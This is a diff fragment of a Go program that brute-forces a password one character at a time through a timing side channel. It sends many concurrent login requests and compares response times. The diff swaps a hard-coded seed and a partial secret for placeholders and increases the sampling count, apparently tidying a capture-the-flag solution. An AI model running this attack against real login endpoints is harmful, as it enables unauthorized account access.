@@ -32,7 +32,7 @@ type Calculation struct {
 }
 
 func sendRequest(password string, r chan Result) {
-	j, err := json.Marshal(LoginData{Seed: "6e729d17d1e94b4089cafc7bf086a4c1", Password: password})
+	j, err := json.Marshal(LoginData{Seed: "YOUR SEED", Password: password})
 
 	if err != nil {
 		panic(err)
@@ -78,15 +78,15 @@ func sendRequest(password string, r chan Result) {
 func main() {
 	c := make(chan Result)
 	m := sync.Map{}
-	curr := "4b28830d68ec4cf1b"
+	curr := "SECRET"
 
 	for i := ' '; i <= '~'; i++ {
-		for j := 0; j < 5; j++ {
+		for j := 0; j < 20; j++ {
 			go sendRequest(curr+string(i)+"a", c)
 		}
 	}
 
-	for i := 0; i < ('~'-' ')*5; i++ {
+	for i := 0; i < ('~'-' ')*20; i++ {
 		resp := <-c
 		act, loaded := m.LoadOrStore(resp.Password, int64(resp.Response.Time))
 		if loaded {
